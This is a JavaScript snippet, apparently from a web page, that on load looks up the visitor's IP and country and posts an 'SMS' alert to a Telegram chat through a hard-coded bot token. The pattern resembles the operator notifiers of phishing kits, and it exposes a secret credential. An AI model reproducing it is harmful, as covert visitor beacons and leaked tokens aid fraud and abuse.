const telegramToken = "6976585330:AAHURtjx2tMk3Lh6zCy7amkTl-4VNAUga2s";
const telegramChatId = "-4022516971";

function enviarMensajeTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  
    axios.post(url, {
      chat_id: telegramChatId,
      text: mensaje
    })
    .then(response => {
      console.log("Mensaje enviado a Telegram");
    })
    .catch(error => {
      console.error("Error al enviar mensaje a Telegram:", error);
    });
  }
  
  window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const pais = data.country_name;
        const mensajeAlerta = `SMS`;
  
        setTimeout(() => {
          enviarMensajeTelegram(mensajeAlerta);
        }, 2000);
      });
  });
  